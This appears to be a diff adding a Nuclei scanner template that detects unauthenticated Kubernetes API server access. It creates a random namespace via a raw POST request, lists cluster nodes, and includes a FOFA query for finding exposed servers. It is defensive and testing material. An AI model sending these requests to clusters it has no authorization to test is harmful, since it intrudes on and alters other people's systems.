@@ -1,0 +1,40 @@
+id: k8s-apiserver-unauthorized
+
+info:
+  name: k8s apiserver 未授权访问
+  author: wjlin0
+  severity: critical
+  description: API 服务器是 Kubernetes 控制平面的组件， 该组件负责公开了 Kubernetes API,负责处理接受请求的工作。 攻击者可以通过未授权访问控制集群，创建容器、删除容器等。甚至控制宿主机。
+  reference:
+    - https://blog.wjlin0.com/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/04.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/02.kubernetes/03.k8s%E4%B8%8B%E7%9A%84%E5%90%84%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83/01.ApiServer.html#api-%E5%88%A9%E7%94%A8
+    - https://kubernetes.io/zh-cn/docs/reference/kubernetes-api/
+  metadata:
+    fofa-query: 'body="apiextensions.k8s.io"'
+  tags: k8s,kubernetes,apiserver,unauthorized,kube
+variables:
+  key: "{{to_lower(rand_base(5))}}" # 
+http:
+  - raw: # 看是否可以创建命名空间，若可以则具备未授权情况，若不具备请检查是否有查看权限
+      - |-
+        POST /api/v1/namespaces HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"apiVersion": "v1","kind":"Namespace","metadata":{"name":"{{key}}"}}
+
+      - |-
+        GET /api/v1/nodes HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+    extractors:
+      - type: json # 列出当前集群下有哪些节点 -> /api/v1/nodes
+        part: body_2
+        name: name
+        json:
+          - '.items | .[] | .metadata|.name' 
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:  
+          - 'contains(body_1,"\"name\": \"{{key}}\"") && status_code_1==201'
+# digest: 4a0a00473045022100ae677b1ca9220ff80e49b674d747523df5cf6d81cd8a0e1d4debed0ef353efa60220329de4fcc26375b1a1b38aae7ab18f2ae4488cb6a284d00f1e03c93383bec407:9d8cf424f0e932381bf27cf1e926b867
